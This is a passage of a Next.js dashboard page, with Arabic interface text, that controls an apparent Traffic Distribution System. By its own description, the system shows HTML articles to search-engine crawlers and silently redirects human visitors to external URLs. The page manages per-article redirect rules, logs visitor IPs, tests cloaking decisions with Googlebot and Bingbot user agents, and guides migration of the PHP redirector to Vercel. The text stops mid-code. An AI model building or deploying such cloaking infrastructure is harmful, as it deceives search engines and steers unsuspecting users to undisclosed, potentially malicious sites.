'use client'

import { useCallback, useEffect, useState } from 'react'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Textarea } from '@/components/ui/textarea'
import { Switch } from '@/components/ui/switch'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Skeleton } from '@/components/ui/skeleton'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import {
  Activity,
  Bot,
  CheckCircle2,
  ClipboardCopy,
  ExternalLink,
  FileText,
  Globe,
  MousePointerClick,
  Plus,
  RefreshCw,
  Rocket,
  Search,
  ShieldCheck,
  Trash2,
  Users,
  Zap,
} from 'lucide-react'
import { toast } from 'sonner'

/* ------------------------------------------------------------------ types */
interface RedirectRule {
  id: string
  articleId: string
  targetUrl: string
  note: string | null
  active: boolean
  clicks: number
  createdAt: string
  updatedAt: string
}

interface ClickLog {
  id: string
  articleId: string
  targetUrl: string
  ip: string
  ua: string | null
  createdAt: string
}

interface KnownIp {
  id: string
  ip: string
  createdAt: string
}

interface Stats {
  totals: { rules: number; clicks: number; uniqueIps: number; logEntries: number }
  topRules: RedirectRule[]
  recentClicks: ClickLog[]
  recentIps: KnownIp[]
}

interface Article {
  id: string
  hasRule: boolean
  rule: { targetUrl: string; active: boolean; clicks: number } | null
}

interface TestResult {
  ids: string
  ua: string
  ip: string
  isCrawler: boolean
  rule: { targetUrl: string; active: boolean; clicks: number } | null
  decision: 'article' | 'redirect' | 'google_fallback'
  redirectUrl: string | null
  note: string
}

/* -------------------------------------------------------------- helpers */
async function jget<T>(url: string): Promise<T> {
  const r = await fetch(url, { cache: 'no-store' })
  if (!r.ok) throw new Error(`${r.status} ${r.statusText}`)
  return r.json()
}
async function jpost<T>(url: string, body: unknown): Promise<T> {
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
  const data = await r.json().catch(() => ({}))
  if (!r.ok) throw new Error((data as any)?.error || `${r.status}`)
  return data as T
}
async function jpatch<T>(url: string, body: unknown): Promise<T> {
  const r = await fetch(url, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
  const data = await r.json().catch(() => ({}))
  if (!r.ok) throw new Error((data as any)?.error || `${r.status}`)
  return data as T
}
async function jdel(url: string): Promise<void> {
  const r = await fetch(url, { method: 'DELETE' })
  if (!r.ok) throw new Error(`${r.status}`)
}

const fmtDate = (s: string) => {
  try {
    return new Date(s).toLocaleString('ar-EG', { dateStyle: 'short', timeStyle: 'medium' })
  } catch {
    return s
  }
}

/* =================================================================== PAGE */
export default function Page() {
  return (
    <div dir="rtl" className="min-h-screen flex flex-col bg-muted/30">
      <Header />
      <main className="flex-1 w-full max-w-7xl mx-auto px-4 sm:px-6 py-6">
        <Tabs defaultValue="overview" className="w-full">
          <TabsList className="grid w-full grid-cols-2 md:grid-cols-5 h-auto">
            <TabsTrigger value="overview" className="gap-1.5">
              <Activity className="size-4" /> نظرة عامة
            </TabsTrigger>
            <TabsTrigger value="rules" className="gap-1.5">
              <Zap className="size-4" /> قواعد التوجيه
            </TabsTrigger>
            <TabsTrigger value="articles" className="gap-1.5">
              <FileText className="size-4" /> المقالات
            </TabsTrigger>
            <TabsTrigger value="tester" className="gap-1.5">
              <Bot className="size-4" /> اختبار النظام
            </TabsTrigger>
            <TabsTrigger value="migration" className="gap-1.5">
              <Rocket className="size-4" /> دليل الترحيل
            </TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="mt-6">
            <OverviewTab />
          </TabsContent>
          <TabsContent value="rules" className="mt-6">
            <RulesTab />
          </TabsContent>
          <TabsContent value="articles" className="mt-6">
            <ArticlesTab />
          </TabsContent>
          <TabsContent value="tester" className="mt-6">
            <TesterTab />
          </TabsContent>
          <TabsContent value="migration" className="mt-6">
            <MigrationTab />
          </TabsContent>
        </Tabs>
      </main>
      <Footer />
    </div>
  )
}

/* --------------------------------------------------------------- Header */
function Header() {
  return (
    <header className="border-b bg-background/80 backdrop-blur sticky top-0 z-30">
      <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="size-10 rounded-xl bg-primary text-primary-foreground grid place-items-center shadow-sm">
            <ShieldCheck className="size-5" />
          </div>
          <div>
            <h1 className="text-lg sm:text-xl font-bold leading-tight">
              لوحة تحكم نظام TDS
            </h1>
            <p className="text-xs text-muted-foreground">
              البصيرة — نظام توزيع الزوار (Traffic Distribution System)
            </p>
          </div>
        </div>
        <Badge variant="secondary" className="gap-1.5 shrink-0">
          <span className="size-2 rounded-full bg-emerald-500 animate-pulse" />
          Next.js · Vercel
        </Badge>
      </div>
    </header>
  )
}

function Footer() {
  return (
    <footer className="mt-auto border-t bg-background">
      <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 py-5 text-xs text-muted-foreground flex flex-col sm:flex-row items-center justify-between gap-2">
        <p>
          تم ترحيل النظام من PHP إلى Next.js — يعمل على Vercel بدون ملفات PHP أو سجلات
          مسطحة.
        </p>
        <p className="font-mono">/api/input ← /server/input.php</p>
      </div>
    </footer>
  )
}

/* ----------------------------------------------------------- Overview tab */
function OverviewTab() {
  const { data, loading, reload } = useAsync<Stats>('/api/stats')

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold tracking-tight">نظرة عامة</h2>
          <p className="text-sm text-muted-foreground">
            إحصائيات لحظية لأداء نظام التوجيه.
          </p>
        </div>
        <Button variant="outline" size="sm" onClick={reload} disabled={loading} className="gap-1.5">
          <RefreshCw className={loading ? 'size-4 animate-spin' : 'size-4'} /> تحديث
        </Button>
      </div>

      <div className="grid gap-4 grid-cols-2 lg:grid-cols-4">
        <StatCard
          icon={<Zap className="size-5" />}
          label="قواعد التوجيه"
          value={loading ? null : data?.totals.rules ?? 0}
          tint="text-amber-600 bg-amber-50"
        />
        <StatCard
          icon={<MousePointerClick className="size-5" />}
          label="إجمالي النقرات"
          value={loading ? null : data?.totals.clicks ?? 0}
          tint="text-emerald-600 bg-emerald-50"
        />
        <StatCard
          icon={<Users className="size-5" />}
          label="عناوين IP فريدة"
          value={loading ? null : data?.totals.uniqueIps ?? 0}
          tint="text-violet-600 bg-violet-50"
        />
        <StatCard
          icon={<Activity className="size-5" />}
          label="سجل النشاط"
          value={loading ? null : data?.totals.logEntries ?? 0}
          tint="text-sky-600 bg-sky-50"
        />
      </div>

      <div className="grid gap-4 lg:grid-cols-2">
        <Card>
          <CardHeader>
            <CardTitle className="text-base">أعلى القواعد نقرًا</CardTitle>
            <CardDescription>القواعد الأكثر توجيهًا للزوار البشر.</CardDescription>
          </CardHeader>
          <CardContent>
            {loading ? (
              <Skeleton className="h-40" />
            ) : (data?.topRules?.length ?? 0) === 0 ? (
              <EmptyHint text="لا توجد نقرات بعد." />
            ) : (
              <ScrollArea className="max-h-72">
                <div className="space-y-2 pr-1">
                  {data?.topRules.map((r) => (
                    <div
                      key={r.id}
                      className="flex items-center justify-between gap-2 rounded-lg border p-2.5"
                    >
                      <div className="min-w-0">
                        <p className="font-mono text-sm font-semibold">{r.articleId}</p>
                        <p className="text-xs text-muted-foreground truncate" dir="ltr">
                          {r.targetUrl}
                        </p>
                      </div>
                      <Badge variant="secondary" className="gap-1 shrink-0">
                        <MousePointerClick className="size-3" /> {r.clicks}
                      </Badge>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="text-base">آخر عناوين IP المسجلة</CardTitle>
            <CardDescription>أحدث الزوار (يُسجل كل IP مرة واحدة).</CardDescription>
          </CardHeader>
          <CardContent>
            {loading ? (
              <Skeleton className="h-40" />
            ) : (data?.recentIps?.length ?? 0) === 0 ? (
              <EmptyHint text="لا توجد عناوين IP بعد." />
            ) : (
              <ScrollArea className="max-h-72">
                <div className="space-y-1.5 pr-1">
                  {data?.recentIps.map((ip) => (
                    <div
                      key={ip.id}
                      className="flex items-center justify-between gap-2 text-sm"
                    >
                      <span className="font-mono" dir="ltr">
                        {ip.ip}
                      </span>
                      <span className="text-xs text-muted-foreground">
                        {fmtDate(ip.createdAt)}
                      </span>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            )}
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">سجل النشاط الأخير</CardTitle>
          <CardDescription>آخر عمليات التوجيه المسجلة في قاعدة البيانات.</CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <Skeleton className="h-48" />
          ) : (data?.recentClicks?.length ?? 0) === 0 ? (
            <EmptyHint text="لا يوجد نشاط بعد." />
          ) : (
            <ScrollArea className="max-h-80">
              <div className="space-y-2 pr-1">
                {data?.recentClicks.map((c) => (
                  <div
                    key={c.id}
                    className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 rounded-lg border p-2.5 text-sm"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Badge variant="outline" className="font-mono">
                        {c.articleId}
                      </Badge>
                      <span className="text-muted-foreground truncate" dir="ltr">
                        {c.targetUrl}
                      </span>
                    </div>
                    <div className="flex items-center gap-3 text-xs text-muted-foreground shrink-0">
                      <span className="font-mono" dir="ltr">
                        {c.ip}
                      </span>
                      <span>{fmtDate(c.createdAt)}</span>
                    </div>
                  </div>
                ))}
              </div>
            </ScrollArea>
          )}
        </CardContent>
      </Card>
    </div>
  )
}

function StatCard({
  icon,
  label,
  value,
  tint,
}: {
  icon: React.ReactNode
  label: string
  value: number | null
  tint: string
}) {
  return (
    <Card>
      <CardContent className="p-5">
        <div className="flex items-center justify-between">
          <p className="text-sm text-muted-foreground">{label}</p>
          <div className={`size-9 rounded-lg grid place-items-center ${tint}`}>{icon}</div>
        </div>
        <div className="text-3xl font-bold mt-3 tabular-nums">
          {value === null ? <Skeleton className="h-9 w-12" /> : value.toLocaleString('ar-EG')}
        </div>
      </CardContent>
    </Card>
  )
}

function EmptyHint({ text }: { text: string }) {
  return (
    <div className="text-center text-sm text-muted-foreground py-10">{text}</div>
  )
}

/* ------------------------------------------------------------- Rules tab */
function RulesTab() {
  const { data, loading, reload } = useAsync<{ rules: RedirectRule[] }>('/api/redirects')
  const [open, setOpen] = useState(false)
  const [articleId, setArticleId] = useState('')
  const [targetUrl, setTargetUrl] = useState('')
  const [note, setNote] = useState('')
  const [saving, setSaving] = useState(false)

  const create = async () => {
    if (!articleId.trim() || !targetUrl.trim()) {
      toast.error('أدخل معرّف المقال والرابط الوجهة')
      return
    }
    setSaving(true)
    try {
      await jpost('/api/redirects', {
        articleId: articleId.trim(),
        targetUrl: targetUrl.trim(),
        note: note.trim() || undefined,
        active: true,
      })
      toast.success('تمت إضافة القاعدة')
      setArticleId('')
      setTargetUrl('')
      setNote('')
      setOpen(false)
      reload()
    } catch (e: any) {
      toast.error(e.message || 'فشل الإضافة')
    } finally {
      setSaving(false)
    }
  }

  const toggle = async (r: RedirectRule) => {
    try {
      await jpatch(`/api/redirects/${r.id}`, { active: !r.active })
      reload()
    } catch (e: any) {
      toast.error(e.message)
    }
  }

  const remove = async (r: RedirectRule) => {
    if (!confirm(`حذف قاعدة المقال ${r.articleId}؟`)) return
    try {
      await jdel(`/api/redirects/${r.id}`)
      toast.success('تم الحذف')
      reload()
    } catch (e: any) {
      toast.error(e.message)
    }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-2xl font-bold tracking-tight">قواعد التوجيه</h2>
          <p className="text-sm text-muted-foreground">
            كل قاعدة توجّه الزائر البشري إلى رابط خارجي، بينما يرى محرك البحث المقال HTML.
          </p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" size="sm" onClick={reload} disabled={loading} className="gap-1.5">
            <RefreshCw className={loading ? 'size-4 animate-spin' : 'size-4'} /> تحديث
          </Button>
          <Button size="sm" onClick={() => setOpen((v) => !v)} className="gap-1.5">
            <Plus className="size-4" /> إضافة قاعدة
          </Button>
        </div>
      </div>

      {open && (
        <Card>
          <CardHeader>
            <CardTitle className="text-base">قاعدة توجيه جديدة</CardTitle>
          </CardHeader>
          <CardContent className="grid gap-4 sm:grid-cols-3">
            <div className="space-y-1.5">
              <Label htmlFor="aid">معرّف المقال (ids)</Label>
              <Input
                id="aid"
                value={articleId}
                onChange={(e) => setArticleId(e.target.value)}
                placeholder="2002037"
                dir="ltr"
                className="font-mono"
              />
            </div>
            <div className="space-y-1.5 sm:col-span-2">
              <Label htmlFor="turl">الرابط الوجهة</Label>
              <Input
                id="turl"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://example.com"
                dir="ltr"
              />
            </div>
            <div className="space-y-1.5 sm:col-span-3">
              <Label htmlFor="note">ملاحظة (اختياري)</Label>
              <Textarea
                id="note"
                value={note}
                onChange={(e) => setNote(e.target.value)}
                placeholder="وصف موجز للقاعدة"
                rows={2}
              />
            </div>
            <div className="sm:col-span-3 flex gap-2 justify-end">
              <Button variant="outline" onClick={() => setOpen(false)}>
                إلغاء
              </Button>
              <Button onClick={create} disabled={saving} className="gap-1.5">
                {saving ? <RefreshCw className="size-4 animate-spin" /> : <CheckCircle2 className="size-4" />}
                حفظ القاعدة
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      <Card>
        <CardContent className="p-0">
          {loading ? (
            <div className="p-6 space-y-2">
              {Array.from({ length: 5 }).map((_, i) => (
                <Skeleton key={i} className="h-12" />
              ))}
            </div>
          ) : (data?.rules?.length ?? 0) === 0 ? (
            <EmptyHint text="لا توجد قواعد. ابدأ بإضافة قاعدة." />
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-28">معرّف المقال</TableHead>
                    <TableHead>الرابط الوجهة</TableHead>
                    <TableHead>ملاحظة</TableHead>
                    <TableHead className="text-center">النقرات</TableHead>
                    <TableHead className="text-center">مفعّلة</TableHead>
                    <TableHead className="text-center">حذف</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {data?.rules.map((r) => (
                    <TableRow key={r.id}>
                      <TableCell className="font-mono font-semibold">{r.articleId}</TableCell>
                      <TableCell dir="ltr" className="max-w-xs truncate">
                        <a
                          href={r.targetUrl}
                          target="_blank"
                          rel="noreferrer"
                          className="text-primary hover:underline inline-flex items-center gap-1"
                        >
                          {r.targetUrl}
                          <ExternalLink className="size-3 shrink-0" />
                        </a>
                      </TableCell>
                      <TableCell className="text-muted-foreground text-sm">
                        {r.note || '—'}
                      </TableCell>
                      <TableCell className="text-center tabular-nums">{r.clicks}</TableCell>
                      <TableCell className="text-center">
                        <Switch checked={r.active} onCheckedChange={() => toggle(r)} />
                      </TableCell>
                      <TableCell className="text-center">
                        <Button
                          size="icon"
                          variant="ghost"
                          className="size-8 text-destructive hover:text-destructive"
                          onClick={() => remove(r)}
                        >
                          <Trash2 className="size-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}

/* ---------------------------------------------------------- Articles tab */
function ArticlesTab() {
  const { data, loading, reload } = useAsync<{ articles: Article[] }>('/api/articles')
  const [filter, setFilter] = useState<'all' | 'covered' | 'uncovered'>('all')

  const list = (data?.articles ?? []).filter((a) => {
    if (filter === 'covered') return a.hasRule
    if (filter === 'uncovered') return !a.hasRule
    return true
  })

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-2xl font-bold tracking-tight">المقالات</h2>
          <p className="text-sm text-muted-foreground">
            ملفات HTML في <code dir="ltr">/public/articles</code> التي تُعرض لمحركات البحث.
          </p>
        </div>
        <Button variant="outline" size="sm" onClick={reload} disabled={loading} className="gap-1.5">
          <RefreshCw className={loading ? 'size-4 animate-spin' : 'size-4'} /> تحديث
        </Button>
      </div>

      <div className="flex gap-2">
        {(['all', 'covered', 'uncovered'] as const).map((f) => (
          <Button
            key={f}
            size="sm"
            variant={filter === f ? 'default' : 'outline'}
            onClick={() => setFilter(f)}
          >
            {f === 'all' ? 'الكل' : f === 'covered' ? 'مغطّاة بقاعدة' : 'بدون قاعدة'}
          </Button>
        ))}
      </div>

      <Card>
        <CardContent className="p-0">
          {loading ? (
            <div className="p-6 space-y-2">
              {Array.from({ length: 8 }).map((_, i) => (
                <Skeleton key={i} className="h-10" />
              ))}
            </div>
          ) : list.length === 0 ? (
            <EmptyHint text="لا توجد مقالات مطابقة." />
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-40">معرّف المقال</TableHead>
                    <TableHead>الحالة</TableHead>
                    <TableHead>الرابط الوجهة</TableHead>
                    <TableHead className="text-center">النقرات</TableHead>
                    <TableHead className="text-center">معاينة</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {list.map((a) => (
                    <TableRow key={a.id}>
                      <TableCell className="font-mono font-semibold">{a.id}</TableCell>
                      <TableCell>
                        {a.hasRule ? (
                          <Badge variant={a.rule?.active ? 'default' : 'secondary'} className="gap-1">
                            <CheckCircle2 className="size-3" />
                            {a.rule?.active ? 'موجّه' : 'معطّل'}
                          </Badge>
                        ) : (
                          <Badge variant="outline">يعرض المقال للجميع</Badge>
                        )}
                      </TableCell>
                      <TableCell dir="ltr" className="max-w-xs truncate text-sm text-muted-foreground">
                        {a.rule?.targetUrl || '—'}
                      </TableCell>
                      <TableCell className="text-center tabular-nums">
                        {a.rule?.clicks ?? 0}
                      </TableCell>
                      <TableCell className="text-center">
                        <a
                          href={`/api/input?ids=${a.id}`}
                          target="_blank"
                          rel="noreferrer"
                          className="inline-flex items-center gap-1 text-primary hover:underline text-sm"
                        >
                          <Search className="size-3.5" /> اختبر
                        </a>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}

/* ----------------------------------------------------------- Tester tab */
function TesterTab() {
  const [ids, setIds] = useState('2002037')
  const [ua, setUa] = useState('')
  const [result, setResult] = useState<TestResult | null>(null)
  const [loading, setLoading] = useState(false)

  const run = async () => {
    if (!ids.trim()) {
      toast.error('أدخل معرّف المقال')
      return
    }
    setLoading(true)
    setResult(null)
    try {
      const params = new URLSearchParams({ ids: ids.trim() })
      if (ua.trim()) params.set('ua', ua.trim())
      const r = await jget<TestResult>(`/api/test-crawler?${params}`)
      setResult(r)
    } catch (e: any) {
      toast.error(e.message)
    } finally {
      setLoading(false)
    }
  }

  const presets = [
    { label: 'Googlebot', ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
    { label: 'Bingbot', ua: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)' },
    { label: 'زائر بشري (Chrome)', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36' },
    { label: 'iPhone Safari', ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1' },
  ]

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-2xl font-bold tracking-tight">اختبار النظام</h2>
        <p className="text-sm text-muted-foreground">
          اختبر القرار الذي يتخذه النظام لأي معرّف وزائر — دون تسجيل أي بيانات.
        </p>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">إدخال الاختبار</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-4 sm:grid-cols-2">
            <div className="space-y-1.5">
              <Label htmlFor="tids">معرّف المقال</Label>
              <Input
                id="tids"
                value={ids}
                onChange={(e) => setIds(e.target.value)}
                placeholder="2002037"
                dir="ltr"
                className="font-mono"
              />
            </div>
            <div className="space-y-1.5">
              <Label htmlFor="tua">User-Agent (اختياري)</Label>
              <Input
                id="tua"
                value={ua}
                onChange={(e) => setUa(e.target.value)}
                placeholder="اتركه فارغًا لاستخدام المتصفح الحالي"
                dir="ltr"
              />
            </div>
          </div>
          <div className="flex flex-wrap gap-2">
            {presets.map((p) => (
              <Button
                key={p.label}
                size="sm"
                variant="outline"
                onClick={() => setUa(p.ua)}
                className="gap-1.5"
              >
                <Bot className="size-3.5" /> {p.label}
              </Button>
            ))}
          </div>
          <Button onClick={run} disabled={loading} className="gap-1.5">
            {loading ? <RefreshCw className="size-4 animate-spin" /> : <Zap className="size-4" />}
            تشغيل الاختبار
          </Button>
        </CardContent>
      </Card>

      {result && (
        <Card>
          <CardHeader>
            <CardTitle className="text-base">نتيجة الاختبار</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-3 sm:grid-cols-3">
              <ResultBadge
                ok={result.isCrawler}
                label={result.isCrawler ? 'محرّك بحث' : 'زائر بشري'}
                icon={<Bot className="size-4" />}
              />
              <ResultBadge
                ok={result.decision === 'redirect'}
                label={
                  result.decision === 'redirect'
                    ? 'توجيه خارجي'
                    : result.decision === 'article'
                      ? 'عرض المقال'
                      : 'احتياطي Google'
                }
                icon={<Zap className="size-4" />}
              />
              <ResultBadge
                ok={!!result.rule}
                label={result.rule ? 'يوجد قاعدة' : 'لا توجد قاعدة'}
                icon={<ShieldCheck className="size-4" />}
              />
            </div>

            <Separator />

            <div className="grid gap-2 text-sm">
              <Row label="معرّف المقال" value={result.ids} mono />
              <Row label="عنوان IP" value={result.ip} mono />
              <Row label="User-Agent" value={result.ua || '—'} mono />
              <Row
                label="الرابط الوجهة"
                value={result.redirectUrl || '—'}
                mono
              />
            </div>

            <div className="rounded-lg bg-muted/60 p-3 text-sm">
              <p className="font-medium mb-1">التفسير:</p>
              <p className="text-muted-foreground">{result.note}</p>
            </div>

            <div className="flex gap-2">
              <a
                href={`/api/input?ids=${encodeURIComponent(result.ids)}`}
                target="_blank"
                rel="noreferrer"
              >
                <Button variant="outline" size="sm" className="gap-1.5">
                  <ExternalLink className="size-4" /> افتح /api/input مباشرة
                </Button>
              </a>
              <Button
                variant="outline"
                size="sm"
                className="gap-1.5"
                onClick={() => {
                  navigator.clipboard?.writeText(
                    `${window.location.origin}/api/input?ids=${encodeURIComponent(result.ids)}`
                  )
                  toast.success('تم نسخ الرابط')
                }}
              >
                <ClipboardCopy className="size-4" /> انسخ رابط API
              </Button>
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  )
}

function ResultBadge({ ok, label, icon }: { ok: boolean; label: string; icon: React.ReactNode }) {
  return (
    <div
      className={`flex items-center gap-2 rounded-lg border p-3 ${
        ok ? 'border-emerald-200 bg-emerald-50 text-emerald-700' : 'bg-muted text-muted-foreground'
      }`}
    >
      {icon}
      <span className="font-medium text-sm">{label}</span>
    </div>
  )
}

function Row({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex items-start justify-between gap-4 rounded-md border p-2.5">
      <span className="text-muted-foreground shrink-0">{label}</span>
      <span className={`text-end ${mono ? 'font-mono text-xs' : ''}`} dir="ltr">
        {value}
      </span>
    </div>
  )
}

/* -------------------------------------------------------- Migration tab */
function MigrationTab() {
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-2xl font-bold tracking-tight">دليل الترحيل إلى Vercel</h2>
        <p className="text-sm text-muted-foreground">
          شرح ما تغيّر وكيف يعمل النظام الآن وما يجب فعله عند النشر على Vercel.
        </p>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-base flex items-center gap-2">
            <Globe className="size-4" /> لماذا توقف النظام على Vercel؟
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 text-sm leading-relaxed">
          <p>
            كان النظام يعمل على خادم PHP عادي، لكن Vercel بيئة serverless لها ثلاثة قيود
            منعت تشغيله كما هو:
          </p>
          <ul className="list-disc pr-5 space-y-1.5">
            <li>
              <strong>PHP غير مدعوم</strong> — ملف{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">server_dir/input.php</code> كان
              يُخدم كنص خام بدل تنفيذه، فيرى الزائر كود PHP بدل نتيجة التوجيه.
            </li>
            <li>
              <strong>نظام الملفات للقراءة فقط</strong> — التسجيل في{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">data/clicks.log</code> و{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">data/ips.txt</code> لا يُحفظ بين
              الطلبات على Vercel.
            </li>
            <li>
              <strong>إعادة كتابة شاملة معطلة</strong> — قاعدة{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">/(.*) → /pdfviewer/api.pdf</code>{' '}
              في <code dir="ltr" className="bg-muted px-1 rounded">vercel.json</code> كانت تعيد
              كل المسارات إلى PDF وتُلغي منطق التوجيه.
            </li>
          </ul>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base flex items-center gap-2">
            <Rocket className="size-4" /> ما الذي تم في الترحيل
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 text-sm leading-relaxed">
          <ul className="list-disc pr-5 space-y-1.5">
            <li>
              استبدلنا <code dir="ltr" className="bg-muted px-1 rounded">input.php</code> بمسار
              Next.js: <code dir="ltr" className="bg-muted px-1 rounded">/api/input</code> — نفس
              المنطق بالضبط (كشف البوت ← عرض المقال، بشري ← توجيه JSON).
            </li>
            <li>
              أضفنا إعادة كتابة في <code dir="ltr" className="bg-muted px-1 rounded">next.config.ts</code>{' '}
              من <code dir="ltr" className="bg-muted px-1 rounded">/server/input.php</code> إلى{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">/api/input</code>، فيعمل السكربت{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">good.js</code> دون أي تعديل.
            </li>
            <li>
              نقلنا التسجيل من ملفات مسطحة إلى قاعدة بيانات (Prisma). في بيئة التطوير SQLite؛
              للإنتاج على Vercel استخدم Postgres أو Vercel KV.
            </li>
            <li>
              حافظنا على <code dir="ltr" className="bg-muted px-1 rounded">good.js</code> و{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">articles/*.html</code> و{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">pdfviewer/api.pdf</code> كملفات
              ثابتة في <code dir="ltr" className="bg-muted px-1 rounded">public/</code>.
            </li>
            <li>
              أضفنا لوحة تحكم لإدارة القواعد وعرض الإحصائيات واختبار النظام مباشرة.
            </li>
          </ul>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base flex items-center gap-2">
            <ShieldCheck className="size-4" /> خطوات النشر على Vercel
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 text-sm leading-relaxed">
          <ol className="list-decimal pr-5 space-y-2">
            <li>
              ارفع هذا المشروع إلى مستودع GitHub ثم اربطه بـ Vercel.
            </li>
            <li>
              في إعدادات المشروع على Vercel، أضف متغير البيئة{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">DATABASE_URL</code> بقاعدة بيانات
              حقيقية (يُنصح بـ <strong>Vercel Postgres</strong> أو{' '}
              <strong>Neon</strong> أو <strong>Supabase</strong>).
            </li>
            <li>
              بدّل مزوّد Prisma من SQLite إلى PostgreSQL في{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">prisma/schema.prisma</code>:
              <pre dir="ltr" className="bg-muted text-xs rounded-md p-3 mt-1 overflow-x-auto">
{`datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}`}
              </pre>
            </li>
            <li>
              شغّل الهجرة بعد أول نشر:{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">npx prisma db push</code> (أو
              استخدم <code dir="ltr" className="bg-muted px-1 rounded">prisma migrate deploy</code>).
            </li>
            <li>
              احذف <code dir="ltr" className="bg-muted px-1 rounded">vercel.json</code> القديم
              من المستودع الأصلي — لم يعد ضروريًا، فإعدادات Next.js تتعامل مع كل شيء.
            </li>
            <li>
              تأكد أن <code dir="ltr" className="bg-muted px-1 rounded">good.js</code> يشير إلى{' '}
              نفس الدومين (إن كان يشير إلى{' '}
              <code dir="ltr" className="bg-muted px-1 rounded">trackpoint.sb</code> فحدّثه إلى
              دومينك الجديد على Vercel).
            </li>
          </ol>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base flex items-center gap-2">
            <FileText className="size-4" /> خريطة المسارات
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>المسار القديم (PHP)</TableHead>
                  <TableHead>المسار الجديد (Next.js)</TableHead>
                  <TableHead>الوصف</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {[
                  ['/server/input.php?ids=X', '/api/input?ids=X', 'منطق TDS (كشف + توجيه + تسجيل)'],
                  ['/server/good.js', '/server/good.js', 'سكربت العميل (ثابت دون تغيير)'],
                  ['/articles/X.html', '/articles/X.html', 'مقالات HTML ثابتة'],
                  ['/pdfviewer/api.pdf', '/pdfviewer/api.pdf', 'ملف PDF ثابت'],
                  ['data/clicks.log', 'جدول ClickLog', 'سجل النقرات في قاعدة البيانات'],
                  ['data/ips.txt', 'جدول KnownIp', 'عناوين IP الفريدة'],
                  ['—', '/api/stats', 'إحصائيات اللوحة'],
                  ['—', '/api/redirects', 'إدارة قواعد التوجيه'],
                  ['—', '/api/test-crawler', 'اختبار القرار دون تسجيل'],
                ].map((row) => (
